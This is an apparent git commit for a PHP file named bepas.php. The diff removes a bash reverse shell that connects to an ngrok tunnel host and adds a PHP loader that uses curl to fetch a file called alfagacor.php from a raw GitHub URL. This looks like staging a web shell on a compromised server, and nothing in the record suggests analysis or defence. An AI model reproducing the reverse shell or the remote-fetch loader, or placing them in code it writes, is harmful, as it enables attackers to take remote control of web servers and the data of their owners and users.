fe0207f62973563f1d9b29c0261a2e329c2e2e63
413X308 <PhillipsBarbara4458@outlook.com>
2026-03-16 22:56:54 +0700

    Update bepas.php

--- bepas.php
+++ bepas.php
@@ -1,1 +1,10 @@
-sh -i >& /dev/tcp/0.tcp.ap.ngrok.io/18137 0>&1
+<?php
+    ini_set('display_errors', 1);
+    error_reporting(E_ALL);
+    $Url = "https://raw.githubusercontent.com/RaitoKazuki/sh/refs/heads/main/alfagacor.php";
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $Url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    $output = curl_exec($ch);
+    curl_close($ch);
+?>
